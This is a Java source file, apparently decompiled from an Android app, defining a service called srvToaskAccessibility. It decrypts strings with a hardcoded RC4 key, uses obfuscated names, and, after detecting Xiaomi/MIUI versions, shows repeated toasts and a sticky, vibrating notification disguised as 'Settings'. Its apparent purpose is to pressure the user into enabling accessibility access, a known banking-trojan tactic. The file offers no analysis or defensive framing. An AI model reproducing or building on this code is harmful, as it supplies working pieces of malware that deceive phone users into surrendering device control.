package com.example.mmm.Service;

import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import com.example.mmm.*;
import android.content.*;
import android.content.res.*;
import android.app.*;
import android.os.*;
import android.widget.*;

public class srvToaskAccessibility extends Service
{
    utils promote$;
    constants settled$;
    
    public srvToaskAccessibility() {
        super();
        this.promote$ = new utils();
        this.settled$ = new constants();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    private void a(final Context context, final String contentText) {
        if (Build$VERSION.SDK_INT > 25) {
            final NotificationManager notificationManager = (NotificationManager)context.getSystemService("notification");
            final PendingIntent activity = PendingIntent.getActivity(context, 0, new Intent((Context)this, (Class)mainActivity.class), 0);
            final String s = "channel_1";
            final String description = "Xiaomi";
            final NotificationChannel notificationChannel = new NotificationChannel(s, (CharSequence)"123", 4);
            notificationChannel.setDescription(description);
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(-65536);
            notificationChannel.enableVibration(true);
            notificationChannel.setVibrationPattern(new long[] { 1500L, 1500L, 1500L, 1500L, 1500L });
            notificationChannel.setShowBadge(false);
            notificationManager.createNotificationChannel(notificationChannel);
            final Notification$Builder setContentTitle = new Notification$Builder(context, s).setContentTitle((CharSequence)"Title");
            final Resources resources = context.getResources();
            final StringBuilder sb = new StringBuilder();
            sb.append(context.getPackageName());
            sb.append(":mipmap/ic_launcher");
            final Notification build = setContentTitle.setSmallIcon(resources.getIdentifier(sb.toString(), (String)null, (String)null)).setContentTitle((CharSequence)"Settings").setContentText((CharSequence)contentText).setVibrate(new long[] { 1500L, 1500L, 1500L, 1500L, 1500L }).setCategory("msg").setStyle((Notification$Style)new Notification$BigTextStyle().bigText((CharSequence)contentText)).setAutoCancel(false).setContentIntent(activity).setDefaults(2).setDefaults(1).setDefaults(4).build();
            build.flags |= 0x10;
            notificationManager.notify(1, build);
        }
    }
    
    public IBinder onBind(final Intent \u0131ntent) {
        throw new UnsupportedOperationException("");
    }
    
    public int onStartCommand(final Intent \u0131ntent, final int n, final int n2) {
        final utils utils = new utils();
        Toast toast;
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) {
            if (com.example.mmm.Utils.utils.getMiuiVersion() >= 11) {
                final StringBuilder sb = new StringBuilder();
                sb.append(utils._ranch());
                sb.append(utils._numbers());
                toast = Toast.makeText((Context)this, (CharSequence)sb.toString(), 1);
                final StringBuilder sb2 = new StringBuilder();
                sb2.append(utils._ranch());
                sb2.append(utils._numbers());
                this.a((Context)this, sb2.toString());
            }
            else if (com.example.mmm.Utils.utils.getMiuiVersion() == 10) {
                toast = Toast.makeText((Context)this, (CharSequence)utils._numbers(), 1);
                this.a((Context)this, utils._numbers());
            }
            else {
                toast = Toast.makeText((Context)this, (CharSequence)utils._numbers(), 1);
            }
        }
        else {
            toast = Toast.makeText((Context)this, (CharSequence)utils._numbers(), 1);
        }
        toast.show();
        this.stopSelf();
        return n;
    }
}
